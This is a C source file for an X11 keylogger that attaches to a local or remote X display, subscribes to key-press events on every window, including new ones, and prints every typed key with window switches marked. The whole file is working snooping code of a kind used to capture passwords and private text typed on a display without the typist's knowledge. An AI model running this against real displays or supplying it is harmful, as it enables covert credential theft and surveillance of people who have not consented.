/*
 * Original code:  Dominic Giampaolo (nick@cs.maxine.wpi.edu)
 *
 * Hacked like a mofo by Dustin Sallings <dustin@spy.net>
 */
#include <stdio.h>
#include <X11/X.h>
#include <X11/Xlib.h>
#include <X11/Intrinsic.h>
#include <X11/StringDefs.h>
#include <X11/Xutil.h>
#include <X11/Shell.h>

char           *TranslateKeyCode(XEvent * ev);
void            dumpEvent(XKeyEvent * xke);

Window          last_window;

Display        *d;

void 
snoop_all_windows(Window root, unsigned long type)
{
	static int      level = 0;
	Window          parent, *children, *child2;
	unsigned int    nchildren;
	int             stat, i, j, k;

	level++;

	stat = XQueryTree(d, root, &root, &parent, &children, &nchildren);
	if (stat == FALSE) {
		fprintf(stderr, "Can't query window tree...\n");
		return;
	}
	if (nchildren == 0)
		return;

	XSelectInput(d, root, type);

	for (i = 0; i < nchildren; i++) {
		XSelectInput(d, children[i], type);
		snoop_all_windows(children[i], type);
	}

	XFree((char *) children);
}

/* Add new Windows as they arrive */
void
handleCreateEvent(XEvent *ev)
{
	XCreateWindowEvent *xcwe;

	xcwe=(XCreateWindowEvent *)ev;
	snoop_all_windows(xcwe->window, SubstructureNotifyMask|KeyPressMask);

	printf("-- New Window (0x%x) --\n", xcwe->window);
}

/* Record the key events */
void
handleKeyEvent(XEvent *ev)
{
	char *string=NULL;
	string = TranslateKeyCode(ev);
	if (string == NULL)
		return;
	if (*string == '\r')
		printf("\n");
	else if (strlen(string) == 1)
		printf("%s", string);
	else
		printf("<<%s>>", string);
	fflush(stdout);
}

/* maine? */
void 
main(int argc, char **argv)
{
	char           *hostname;
	XEvent          xev;
	int             count = 0;

	if (argv[1] == NULL)
		hostname = ":0";
	else
		hostname = argv[1];

	d = XOpenDisplay(hostname);
	if (d == NULL) {
		fprintf(stderr, "Blah, can't open display: %s\n", hostname);
		exit(10);
	}
	snoop_all_windows(DefaultRootWindow(d),
		SubstructureNotifyMask|KeyPressMask);

	while (1) {
		XNextEvent(d, &xev);

		switch(xev.type) {
			case CreateNotify:
				handleCreateEvent(&xev);
				break;
			case KeyPress:
				handleKeyEvent(&xev);
				break;
			default:
				break;
		}

	}
}


#define KEY_BUFF_SIZE 256
static char     key_buff[KEY_BUFF_SIZE];

/* XKeyEvent -> string */
char           *
TranslateKeyCode(XEvent * ev)
{
	int             count;
	char           *tmp;
	KeySym          ks;
	Window          current_window;

	if (ev) {
		XKeyEvent      *xke = (XKeyEvent *) ev;
		/* dumpEvent(xke); */
		current_window = xke->window;
		if (current_window != last_window) {
			printf("\n -- switched to window 0x%x--\n", current_window);
			last_window = current_window;
		}
		count = XLookupString(xke, key_buff, KEY_BUFF_SIZE, &ks, NULL);
		key_buff[count] = '\0';

		if (count == 0) {
			tmp = XKeysymToString(ks);
			if (tmp)
				strcpy(key_buff, tmp);
			else
				strcpy(key_buff, "");
		}
		return key_buff;
	} else
		return NULL;
}
